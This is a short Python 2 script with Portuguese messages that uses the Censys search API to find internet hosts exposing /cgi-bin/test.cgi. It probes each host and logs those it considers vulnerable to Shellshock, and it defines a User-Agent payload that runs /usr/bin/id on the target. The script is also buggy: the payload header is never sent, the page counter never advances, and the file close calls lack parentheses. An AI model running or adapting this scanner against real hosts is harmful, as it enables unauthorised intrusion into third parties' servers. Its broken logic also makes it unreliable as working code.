# coding=utf-8

from termcolor import cprint
import json
import requests

API_URL = "https://www.censys.io/api/v1"
UID = ""
SECRET = ""

pages = float('inf')
page = 1
acha = 'uid'

query = {'query':'80.http.get.title:/cgi-bin/test.cgi','page':page}
user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}

while page <= pages:
    res = requests.post(API_URL + "/search/ipv4", auth=(UID, SECRET), json=query)
    payload = res.json()

    if res.status_code == 200:
        for r in payload['results']:
            url_test = 'http://'+r['ip']+'/cgi-bin/test.cgi'
            cprint('[+] - Testando conexao '+url_test,'blue')
            try:
                ss = requests.get(url_test, timeout=5, allow_redirects=True)
                sc = ss.status_code
                if sc != 200:
                    cprint("[!] - ALGO DEU ERRADO",'red')
                    print("[!] - STATUS CODE: %d") %(sc)
                    print
                else:
                    cprint("[+] - SUCESSO NA CONEXAO",'green')
                    print("[!] - STATUS CODE: %d") %(sc)
                    arq = open('4B3RT0S.txt','a')
                    arq.writelines(url_test+"\n")
                    arq.close

                    if ss.content.find(acha) != -1:
                        cprint("[+] - VULN3R4V3L",'green','on_red')
                        arq = open('VULN3R4V3L.txt','a')
                        arq.writelines(url_test+ "\n")
                        arq.close
                    print
            except:
                cprint("[!] - HOST PROVAVELMENTE INDISPONIVEL",'red','on_yellow')
                print
